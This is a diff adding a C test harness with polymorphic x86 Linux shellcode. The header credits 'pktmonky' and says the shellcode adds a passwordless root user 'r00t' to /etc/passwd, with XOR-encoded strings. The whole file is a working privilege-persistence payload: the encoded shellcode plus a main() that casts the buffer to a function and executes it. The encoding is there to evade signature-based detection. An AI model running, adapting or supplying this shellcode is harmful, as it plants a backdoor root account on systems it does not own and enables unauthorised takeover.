@@ -1,0 +1,24 @@
+/* Title: Polymorphic Add root user (r00t) with no password ( 85 bytes)
+ * Author: pktmonky
+ * Description: Polymorphic version of shell-storm linux x86 shellcode titled
+ * 'Add root user (r00t) with no password to /etc/passwd' by Kris Katterjohn.
+ * All strings have been XOR encoded.
+ */
+
+
+#include<stdio.h>
+#include<string.h>
+ 
+ 
+unsigned char buf[] =
+"\x31\xdb\xf7\xe3\xeb\x2e\x5e\x89\xf3\x80\x36\xde\x74\x03\x46\xeb\xf8\x89\x53\x0b\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89\x53\x1b\x8d\x4b\x0f\x6a\x0c\x5a\x89\xc3\x31\xc0\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xcd\xff\xff\xff\xf1\xbb\xaa\xbd\xf1\xae\xbf\xad\xad\xa9\xba\x86\x86\x86\x86\xac\xee\xee\xaa\xe4\xe4\xee\xe4\xee\xe4\xe4\xe4\xde"; 
+main()
+{
+
+    printf("Shellcode Length:  %d\n", strlen(buf));
+ 
+    int (*ret)() = (int(*)())buf;
+ 
+    ret();
+ 
+}
